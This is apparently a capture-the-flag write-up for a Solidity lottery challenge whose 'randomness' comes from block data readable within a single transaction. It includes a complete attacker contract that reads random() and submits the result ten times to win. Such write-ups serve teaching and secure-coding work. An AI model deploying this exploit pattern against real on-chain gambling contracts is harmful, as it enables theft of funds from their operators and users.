# Beltway Bandits: The Lottery (`Lottery.sol`) 🎰🎲

> "beat the house with 10 wins in a row. no second chances." my brother in Christ...

## Challenge Information

- Category: Blockchain / Solidity
- Target: `nc 34.116.80.78 31338`
- Files: `Lottery.sol`, `Setup.sol`
- Flag format: `CSSCTF{...}` (ticket-gated — team name required at the netcat launcher)

## TL;DR

`Lottery.guess()` checks your number against `random() % 100`, where `random()` is derived purely from `blockhash`, `block.timestamp`, and `block.difficulty` — all public on-chain values that **don't change during a transaction**. Since `random()` is a `view` function, an attacker contract can just call it, read the exact value, and immediately submit that value as the guess. Do that 10 times in one transaction → 10 wins → solved.

## The "Randomness"

```solidity
keccak256(
    abi.encodePacked(
        blockhash(block.number - 1),
        block.timestamp,
        block.difficulty
    )
)
```

bro called this **randomness**. it was NOT randomness. it was basically **publicly available blockchain seasoning.** 🧂

- `random()` is literally callable — not secret internal magic, you can just ask the contract for it.
- Every input (`block.number`, `block.timestamp`, `block.difficulty`) is constant for the duration of a single transaction.

So the "random" result is fully predictable the moment you ask for it, inside the same call you use to submit your guess. House odds were never real.

## The Exploit

Deploy an attacker contract, loop 10 times. Each iteration:

1. **Ask for the "random" number** — `random() % 100`. It's a `view` call, no gas drama.
2. **Immediately submit that number** — `guess(number)`.

Because the randomness inputs haven't changed mid-transaction, the value `random()` returns is the *exact* value `guess()` expects.

```text
random() → exact answer
guess(answer) → WIN
```

Repeated 10 times, in one transaction. Zero luck, zero gambling, zero skill issue — just reading the contract and noticing the "randomness" was cooked. 💀

### Final exploit contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface ILottery {
    function random() external view returns (uint256);
    function guess(uint256 _guess) external;
    function streaks(address) external view returns (uint256);
}

contract Attack {
    ILottery public immutable lottery;

    constructor(address _lottery) {
        lottery = ILottery(_lottery);
    }

    function pwn() external {
        for (uint256 i = 0; i < 10; i++) {
            uint256 target = lottery.random() % 100;
            lottery.guess(target);
        }
        require(lottery.streaks(address(this)) >= 10, "not won yet");
    }
}
```

Also in [`exploit/Attack.sol`](exploit/Attack.sol).

## Finishing the Lottery

After the 10 consecutive wins:

```text
winner = attacker contract
isSolved() = true
```

Went back to the `netcat` menu, submitted the team name as the ticket, selected option `3`, and got the flag.

```text
1 - launch
```

The lottery was officially **not beating the allegations.** 🎰💀

## Flag

```text
CSSCTF{PLACEHOLDER_ENTER_FLAG_HERE}
```

> Flag already obtained — swap the placeholder above for the real value before publishing.

## Lessons Learned

| Chal | Vulnerability | Fix |
|---|---|---|
| 🚪 Gate | `tx.origin != msg.sender` bypass + hardcoded password hash | Don't use `tx.origin` for access control; don't ship secrets in source |
| 🎰 Lottery | Predictable on-chain "randomness" exploitable in a single transaction | Use an oracle such as Chainlink VRF, or a commit-reveal scheme |

On-chain "randomness" based on block data the contract itself can read during the same transaction is not randomness — it's a vibe check with the answer printed on the wall. 🗿
